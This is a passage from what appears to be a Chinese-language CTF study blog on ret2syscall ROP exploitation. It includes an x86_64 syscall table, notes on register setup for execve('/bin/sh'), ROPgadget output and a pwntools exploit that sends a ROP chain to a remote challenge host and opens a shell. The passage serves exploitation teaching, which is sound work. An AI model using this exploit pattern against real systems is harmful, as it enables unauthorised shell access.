class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line">#ifndef _ASM_X86_UNISTD_64_H</span><br><span class="line">#define _ASM_X86_UNISTD_64_H 1</span><br><span class="line"></span><br><span class="line">#define __NR_read 0</span><br><span class="line">#define __NR_write 1</span><br><span class="line">#define __NR_open 2</span><br><span class="line">#define __NR_close 3</span><br><span class="line">#define __NR_stat 4</span><br><span class="line">#define __NR_fstat 5</span><br><span class="line">#define __NR_lstat 6</span><br><span class="line">#define __NR_poll 7</span><br><span class="line">#define __NR_lseek 8</span><br><span class="line">#define __NR_mmap 9</span><br><span class="line">#define __NR_mprotect 10</span><br><span class="line">#define __NR_munmap 11</span><br><span class="line">#define __NR_brk 12</span><br><span class="line">#define __NR_rt_sigaction 13</span><br><span class="line">#define __NR_rt_sigprocmask 14</span><br><span class="line">#define __NR_rt_sigreturn 15</span><br><span class="line">#define __NR_ioctl 16</span><br><span class="line">#define __NR_pread64 17</span><br><span class="line">#define __NR_pwrite64 18</span><br><span class="line">#define __NR_readv 19</span><br><span class="line">#define __NR_writev 20</span><br><span class="line">#define __NR_access 21</span><br><span class="line">#define __NR_pipe 22</span><br><span class="line">#define __NR_select 23</span><br><span class="line">#define __NR_sched_yield 24</span><br><span class="line">#define __NR_mremap 25</span><br><span class="line">#define __NR_msync 26</span><br><span class="line">#define __NR_mincore 27</span><br><span class="line">#define __NR_madvise 28</span><br><span class="line">#define __NR_shmget 29</span><br><span class="line">#define __NR_shmat 30</span><br><span class="line">#define __NR_shmctl 31</span><br><span class="line">#define __NR_dup 32</span><br><span class="line">#define __NR_dup2 33</span><br><span class="line">#define __NR_pause 34</span><br><span class="line">#define __NR_nanosleep 35</span><br><span class="line">#define __NR_getitimer 36</span><br><span class="line">#define __NR_alarm 37</span><br><span class="line">#define __NR_setitimer 38</span><br><span class="line">#define __NR_getpid 39</span><br><span class="line">#define __NR_sendfile 40</span><br><span class="line">#define __NR_socket 41</span><br><span class="line">#define __NR_connect 42</span><br><span class="line">#define __NR_accept 43</span><br><span class="line">#define __NR_sendto 44</span><br><span class="line">#define __NR_recvfrom 45</span><br><span class="line">#define __NR_sendmsg 46</span><br><span class="line">#define __NR_recvmsg 47</span><br><span class="line">#define __NR_shutdown 48</span><br><span class="line">#define __NR_bind 49</span><br><span class="line">#define __NR_listen 50</span><br><span class="line">#define __NR_getsockname 51</span><br><span class="line">#define __NR_getpeername 52</span><br><span class="line">#define __NR_socketpair 53</span><br><span class="line">#define __NR_setsockopt 54</span><br><span class="line">#define __NR_getsockopt 55</span><br><span class="line">#define __NR_clone 56</span><br><span class="line">#define __NR_fork 57</span><br><span class="line">#define __NR_vfork 58</span><br><span class="line">#define __NR_execve 59</span><br><span class="line">#define __NR_exit 60</span><br><span class="line">#define __NR_wait4 61</span><br><span class="line">#define __NR_kill 62</span><br><span class="line">#define __NR_uname 63</span><br><span class="line">#define __NR_semget 64</span><br><span class="line">#define __NR_semop 65</span><br><span class="line">#define __NR_semctl 66</span><br><span class="line">#define __NR_shmdt 67</span><br><span class="line">#define __NR_msgget 68</span><br><span class="line">#define __NR_msgsnd 69</span><br><span class="line">#define __NR_msgrcv 70</span><br><span class="line">#define __NR_msgctl 71</span><br><span class="line">#define __NR_fcntl 72</span><br><span class="line">#define __NR_flock 73</span><br><span class="line">#define __NR_fsync 74</span><br><span class="line">#define __NR_fdatasync 75</span><br><span class="line">#define __NR_truncate 76</span><br><span class="line">#define __NR_ftruncate 77</span><br><span class="line">#define __NR_getdents 78</span><br><span class="line">#define __NR_getcwd 79</span><br><span class="line">#define __NR_chdir 80</span><br><span class="line">#define __NR_fchdir 81</span><br><span class="line">#define __NR_rename 82</span><br><span class="line">#define __NR_mkdir 83</span><br><span class="line">#define __NR_rmdir 84</span><br><span class="line">#define __NR_creat 85</span><br><span class="line">#define __NR_link 86</span><br><span class="line">#define __NR_unlink 87</span><br><span class="line">#define __NR_symlink 88</span><br><span class="line">#define __NR_readlink 89</span><br><span class="line">#define __NR_chmod 90</span><br><span class="line">#define __NR_fchmod 91</span><br><span class="line">#define __NR_chown 92</span><br><span class="line">#define __NR_fchown 93</span><br><span class="line">#define __NR_lchown 94</span><br><span class="line">#define __NR_umask 95</span><br><span class="line">#define __NR_gettimeofday 96</span><br><span class="line">#define __NR_getrlimit 97</span><br><span class="line">#define __NR_getrusage 98</span><br><span class="line">#define __NR_sysinfo 99</span><br><span class="line">#define __NR_times 100</span><br><span class="line">#define __NR_ptrace 101</span><br><span class="line">#define __NR_getuid 102</span><br><span class="line">#define __NR_syslog 103</span><br><span class="line">#define __NR_getgid 104</span><br><span class="line">#define __NR_setuid 105</span><br><span class="line">#define __NR_setgid 106</span><br><span class="line">#define __NR_geteuid 107</span><br><span class="line">#define __NR_getegid 108</span><br><span class="line">#define __NR_setpgid 109</span><br><span class="line">#define __NR_getppid 110</span><br><span class="line">#define __NR_getpgrp 111</span><br><span class="line">#define __NR_setsid 112</span><br><span class="line">#define __NR_setreuid 113</span><br><span class="line">#define __NR_setregid 114</span><br><span class="line">#define __NR_getgroups 115</span><br><span class="line">#define __NR_setgroups 116</span><br><span class="line">#define __NR_setresuid 117</span><br><span class="line">#define __NR_getresuid 118</span><br><span class="line">#define __NR_setresgid 119</span><br><span class="line">#define __NR_getresgid 120</span><br><span class="line">#define __NR_getpgid 121</span><br><span class="line">#define __NR_setfsuid 122</span><br><span class="line">#define __NR_setfsgid 123</span><br><span class="line">#define __NR_getsid 124</span><br><span class="line">#define __NR_capget 125</span><br><span class="line">#define __NR_capset 126</span><br><span class="line">#define __NR_rt_sigpending 127</span><br><span class="line">#define __NR_rt_sigtimedwait 128</span><br><span class="line">#define __NR_rt_sigqueueinfo 129</span><br><span class="line">#define __NR_rt_sigsuspend 130</span><br><span class="line">#define __NR_sigaltstack 131</span><br><span class="line">#define __NR_utime 132</span><br><span class="line">#define __NR_mknod 133</span><br><span class="line">#define __NR_uselib 134</span><br><span class="line">#define __NR_personality 135</span><br><span class="line">#define __NR_ustat 136</span><br><span class="line">#define __NR_statfs 137</span><br><span class="line">#define __NR_fstatfs 138</span><br><span class="line">#define __NR_sysfs 139</span><br><span class="line">#define __NR_getpriority 140</span><br><span class="line">#define __NR_setpriority 141</span><br><span class="line">#define __NR_sched_setparam 142</span><br><span class="line">#define __NR_sched_getparam 143</span><br><span class="line">#define __NR_sched_setscheduler 144</span><br><span class="line">#define __NR_sched_getscheduler 145</span><br><span class="line">#define __NR_sched_get_priority_max 146</span><br><span class="line">#define __NR_sched_get_priority_min 147</span><br><span class="line">#define __NR_sched_rr_get_interval 148</span><br><span class="line">#define __NR_mlock 149</span><br><span class="line">#define __NR_munlock 150</span><br><span class="line">#define __NR_mlockall 151</span><br><span class="line">#define __NR_munlockall 152</span><br><span class="line">#define __NR_vhangup 153</span><br><span class="line">#define __NR_modify_ldt 154</span><br><span class="line">#define __NR_pivot_root 155</span><br><span class="line">#define __NR__sysctl 156</span><br><span class="line">#define __NR_prctl 157</span><br><span class="line">#define __NR_arch_prctl 158</span><br><span class="line">#define __NR_adjtimex 159</span><br><span class="line">#define __NR_setrlimit 160</span><br><span class="line">#define __NR_chroot 161</span><br><span class="line">#define __NR_sync 162</span><br><span class="line">#define __NR_acct 163</span><br><span class="line">#define __NR_settimeofday 164</span><br><span class="line">#define __NR_mount 165</span><br><span class="line">#define __NR_umount2 166</span><br><span class="line">#define __NR_swapon 167</span><br><span class="line">#define __NR_swapoff 168</span><br><span class="line">#define __NR_reboot 169</span><br><span class="line">#define __NR_sethostname 170</span><br><span class="line">#define __NR_setdomainname 171</span><br><span class="line">#define __NR_iopl 172</span><br><span class="line">#define __NR_ioperm 173</span><br><span class="line">#define __NR_create_module 174</span><br><span class="line">#define __NR_init_module 175</span><br><span class="line">#define __NR_delete_module 176</span><br><span class="line">#define __NR_get_kernel_syms 177</span><br><span class="line">#define __NR_query_module 178</span><br><span class="line">#define __NR_quotactl 179</span><br><span class="line">#define __NR_nfsservctl 180</span><br><span class="line">#define __NR_getpmsg 181</span><br><span class="line">#define __NR_putpmsg 182</span><br><span class="line">#define __NR_afs_syscall 183</span><br><span class="line">#define __NR_tuxcall 184</span><br><span class="line">#define __NR_security 185</span><br><span class="line">#define __NR_gettid 186</span><br><span class="line">#define __NR_readahead 187</span><br><span class="line">#define __NR_setxattr 188</span><br><span class="line">#define __NR_lsetxattr 189</span><br><span class="line">#define __NR_fsetxattr 190</span><br><span class="line">#define __NR_getxattr 191</span><br><span class="line">#define __NR_lgetxattr 192</span><br><span class="line">#define __NR_fgetxattr 193</span><br><span class="line">#define __NR_listxattr 194</span><br><span class="line">#define __NR_llistxattr 195</span><br><span class="line">#define __NR_flistxattr 196</span><br><span class="line">#define __NR_removexattr 197</span><br><span class="line">#define __NR_lremovexattr 198</span><br><span class="line">#define __NR_fremovexattr 199</span><br><span class="line">#define __NR_tkill 200</span><br><span class="line">#define __NR_time 201</span><br><span class="line">#define __NR_futex 202</span><br><span class="line">#define __NR_sched_setaffinity 203</span><br><span class="line">#define __NR_sched_getaffinity 204</span><br><span class="line">#define __NR_set_thread_area 205</span><br><span class="line">#define __NR_io_setup 206</span><br><span class="line">#define __NR_io_destroy 207</span><br><span class="line">#define __NR_io_getevents 208</span><br><span class="line">#define __NR_io_submit 209</span><br><span class="line">#define __NR_io_cancel 210</span><br><span class="line">#define __NR_get_thread_area 211</span><br><span class="line">#define __NR_lookup_dcookie 212</span><br><span class="line">#define __NR_epoll_create 213</span><br><span class="line">#define __NR_epoll_ctl_old 214</span><br><span class="line">#define __NR_epoll_wait_old 215</span><br><span class="line">#define __NR_remap_file_pages 216</span><br><span class="line">#define __NR_getdents64 217</span><br><span class="line">#define __NR_set_tid_address 218</span><br><span class="line">#define __NR_restart_syscall 219</span><br><span class="line">#define __NR_semtimedop 220</span><br><span class="line">#define __NR_fadvise64 221</span><br><span class="line">#define __NR_timer_create 222</span><br><span class="line">#define __NR_timer_settime 223</span><br><span class="line">#define __NR_timer_gettime 224</span><br><span class="line">#define __NR_timer_getoverrun 225</span><br><span class="line">#define __NR_timer_delete 226</span><br><span class="line">#define __NR_clock_settime 227</span><br><span class="line">#define __NR_clock_gettime 228</span><br><span class="line">#define __NR_clock_getres 229</span><br><span class="line">#define __NR_clock_nanosleep 230</span><br><span class="line">#define __NR_exit_group 231</span><br><span class="line">#define __NR_epoll_wait 232</span><br><span class="line">#define __NR_epoll_ctl 233</span><br><span class="line">#define __NR_tgkill 234</span><br><span class="line">#define __NR_utimes 235</span><br><span class="line">#define __NR_vserver 236</span><br><span class="line">#define __NR_mbind 237</span><br><span class="line">#define __NR_set_mempolicy 238</span><br><span class="line">#define __NR_get_mempolicy 239</span><br><span class="line">#define __NR_mq_open 240</span><br><span class="line">#define __NR_mq_unlink 241</span><br><span class="line">#define __NR_mq_timedsend 242</span><br><span class="line">#define __NR_mq_timedreceive 243</span><br><span class="line">#define __NR_mq_notify 244</span><br><span class="line">#define __NR_mq_getsetattr 245</span><br><span class="line">#define __NR_kexec_load 246</span><br><span class="line">#define __NR_waitid 247</span><br><span class="line">#define __NR_add_key 248</span><br><span class="line">#define __NR_request_key 249</span><br><span class="line">#define __NR_keyctl 250</span><br><span class="line">#define __NR_ioprio_set 251</span><br><span class="line">#define __NR_ioprio_get 252</span><br><span class="line">#define __NR_inotify_init 253</span><br><span class="line">#define __NR_inotify_add_watch 254</span><br><span class="line">#define __NR_inotify_rm_watch 255</span><br><span class="line">#define __NR_migrate_pages 256</span><br><span class="line">#define __NR_openat 257</span><br><span class="line">#define __NR_mkdirat 258</span><br><span class="line">#define __NR_mknodat 259</span><br><span class="line">#define __NR_fchownat 260</span><br><span class="line">#define __NR_futimesat 261</span><br><span class="line">#define __NR_newfstatat 262</span><br><span class="line">#define __NR_unlinkat 263</span><br><span class="line">#define __NR_renameat 264</span><br><span class="line">#define __NR_linkat 265</span><br><span class="line">#define __NR_symlinkat 266</span><br><span class="line">#define __NR_readlinkat 267</span><br><span class="line">#define __NR_fchmodat 268</span><br><span class="line">#define __NR_faccessat 269</span><br><span class="line">#define __NR_pselect6 270</span><br><span class="line">#define __NR_ppoll 271</span><br><span class="line">#define __NR_unshare 272</span><br><span class="line">#define __NR_set_robust_list 273</span><br><span class="line">#define __NR_get_robust_list 274</span><br><span class="line">#define __NR_splice 275</span><br><span class="line">#define __NR_tee 276</span><br><span class="line">#define __NR_sync_file_range 277</span><br><span class="line">#define __NR_vmsplice 278</span><br><span class="line">#define __NR_move_pages 279</span><br><span class="line">#define __NR_utimensat 280</span><br><span class="line">#define __NR_epoll_pwait 281</span><br><span class="line">#define __NR_signalfd 282</span><br><span class="line">#define __NR_timerfd_create 283</span><br><span class="line">#define __NR_eventfd 284</span><br><span class="line">#define __NR_fallocate 285</span><br><span class="line">#define __NR_timerfd_settime 286</span><br><span class="line">#define __NR_timerfd_gettime 287</span><br><span class="line">#define __NR_accept4 288</span><br><span class="line">#define __NR_signalfd4 289</span><br><span class="line">#define __NR_eventfd2 290</span><br><span class="line">#define __NR_epoll_create1 291</span><br><span class="line">#define __NR_dup3 292</span><br><span class="line">#define __NR_pipe2 293</span><br><span class="line">#define __NR_inotify_init1 294</span><br><span class="line">#define __NR_preadv 295</span><br><span class="line">#define __NR_pwritev 296</span><br><span class="line">#define __NR_rt_tgsigqueueinfo 297</span><br><span class="line">#define __NR_perf_event_open 298</span><br><span class="line">#define __NR_recvmmsg 299</span><br><span class="line">#define __NR_fanotify_init 300</span><br><span class="line">#define __NR_fanotify_mark 301</span><br><span class="line">#define __NR_prlimit64 302</span><br><span class="line">#define __NR_name_to_handle_at 303</span><br><span class="line">#define __NR_open_by_handle_at 304</span><br><span class="line">#define __NR_clock_adjtime 305</span><br><span class="line">#define __NR_syncfs 306</span><br><span class="line">#define __NR_sendmmsg 307</span><br><span class="line">#define __NR_setns 308</span><br><span class="line">#define __NR_getcpu 309</span><br><span class="line">#define __NR_process_vm_readv 310</span><br><span class="line">#define __NR_process_vm_writev 311</span><br><span class="line">#define __NR_kcmp 312</span><br><span class="line">#define __NR_finit_module 313</span><br><span class="line">#define __NR_sched_setattr 314</span><br><span class="line">#define __NR_sched_getattr 315</span><br><span class="line">#define __NR_renameat2 316</span><br><span class="line">#define __NR_seccomp 317</span><br><span class="line">#define __NR_getrandom 318</span><br><span class="line">#define __NR_memfd_create 319</span><br><span class="line">#define __NR_kexec_file_load 320</span><br><span class="line">#define __NR_bpf 321</span><br><span class="line">#define __NR_execveat 322</span><br><span class="line">#define __NR_userfaultfd 323</span><br><span class="line">#define __NR_membarrier 324</span><br><span class="line">#define __NR_mlock2 325</span><br><span class="line">#define __NR_copy_file_range 326</span><br><span class="line">#define __NR_preadv2 327</span><br><span class="line">#define __NR_pwritev2 328</span><br><span class="line"></span><br><span class="line">#endif /* _ASM_X86_UNISTD_64_H */</span><br></pre></td></tr></table></figure>
<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>先使用cyclic测试出溢出点</p>
<p>确定要调用的系统函数 </p>
<p>再使用工具RODgatgets查找各寄存器、、所在的地址 </p>
<p>然后构造payload中依次对该地址传值</p>
<p>如果没有&#x2F;bin&#x2F;sh就要先调用read函数</p>
<p>32：控制eax&#x3D;0xb,edx,ecx,&#x3D;0,ebx&#x3D;binsh,int_0x80用于中断。</p>
<p>eax-&gt;edx-&gt;ecx-&gt;ebx</p>
<p>32(多系统)：</p>
<p>思路<br>由于程序中并没有&#x2F;bin&#x2F;sh这个字符串，如果执行系统调用必须要手动将&#x2F;bin&#x2F;sh写入到程序bss段中</p>
<p>构造payload可以使用read函数，在内存地址中读取之后用户输入的&#x2F;bin&#x2F;sh 先找到eax，ebx，ecx，edx以及int 0x80的地址</p>
<p>对eax，ebx，ecx，edx填充read函数的参数（在bss段找到一个有权限的地址，带入到ebx中）</p>
<p>再次对eax,ebx,ecx,edx填充，这次使用execve函数，执行之前read函数读取的内容所在的地址内的值 即”&#x2F;bin&#x2F;sh\x00”</p>
<p>执行payload，进行溢出，再次向程序中发送数据 即“&#x2F;bin&#x2F;sh\x00”</p>
<p>64：rdi-&gt;rsi-&gt;rdx-&gt;rcx-&gt;r8-&gt;r9</p>
<p>与32位不同，需要注意以下几点</p>
<p>存储参数的寄存器名不同</p>
<p>ret返回的函数名不同</p>
<p>32位为int 0x80，64位为syscall ret 64位0x3b</p>
<p>64位系统中使用寄存器传递参数（32bit是栈哦）</p>
<p>rdi、rsi、rdx、rcx、r8、r9(1-6个参数)</p>
<p>write(1，buf2，20）</p>
<p>需要控制3个参数,rdi,rsi,rdx</p>
<p>第三个参数代表着输出的size，如果没有rdx的gadget可以暂时不管</p>
<p>输出多少无所谓</p>
<p>思路：</p>
<p>1、想办法调用execve(“&#x2F;bin&#x2F;sh”,null,null)</p>
<p>2、借助栈来传入字符串&#x2F;bin&#x2F;sh</p>
<p>3、系统调用execve</p>
<p>rax &#x3D; 0x3b(64bit)</p>
<p>rdi &#x3D; bin_sh_addr</p>
<p>rsi &#x3D; 0</p>
<p>rdx &#x3D; 0</p>
<p>大家有没有注意到啊，32bit的时候是&#x2F;&#x2F;&#x2F;sh，64的时候恢复成了&#x2F;sh,这是因为34位是4字节，64是8字节，是完全可以放下这个字符串的，不需要担心反斜杠0的问题。</p>
<p>exp示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh = process(&quot;./ret2sys_64&quot;)</span><br><span class="line">sh = remote(&quot;120.79.17.251&quot;,10006)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">pop_rax =0x000000000046b9f8</span><br><span class="line">pop_rdi = 0x00000000004016c3</span><br><span class="line">pop_rdx_rsi =0x00000000004377f9</span><br><span class="line">bss = 0x00000000006c2000</span><br><span class="line">ret = 0x000000000045bac5</span><br><span class="line">payload = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaa&quot;</span><br><span class="line">payload += p64(pop_rax)+p64(0x0)</span><br><span class="line">payload += p64(pop_rdx_rsi)+p64(0x10)+p64(bss)</span><br><span class="line">payload += p64(pop_rdi)+p64(0)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rax)+p64(0x3b)</span><br><span class="line">payload += p64(pop_rdx_rsi)+p64(0)+p64(0)</span><br><span class="line">payload += p64(pop_rdi)+p64(bss)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">sh.sendline(b&quot;/bin/sh\x00&quot;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h6 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h6><p>Linux 在x86上的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：</p>
<p>应用程序调用库函数（API）；</p>
<p>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</p>
<p>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</p>
<p>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</p>
<p>中断处理函数返回到 API 中；</p>
<p>API 将 EAX 返回给应用程序。</p>
<p>应用程序调用系统调用的过程是：</p>
<p>把系统调用的编号存入 EAX；</p>
<p>把函数参数存入其它通用寄存器；</p>
<p>触发 0x80 号中断（int 0x80）。</p>
<p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>
<p>其中，该程序是 32 位，所以我们需要使得</p>
<p>系统调用号，即 eax 应该为 0xb</p>
<p>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</p>
<p>第二个参数，即 ecx 应该为 0</p>
<p>第三个参数，即 edx 应该为 0</p>
<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
<p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p>
<p>类似的，我们可以得到控制其它寄存器的 gadgets</p>
<p>此外，我们需要获得 &#x2F;bin&#x2F;sh 字符串对应的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
<p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &#x27;int&#x27;                 </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>
<p>0xb 为 execve 对应的系统调用号。</p>
<p>exp:</p>
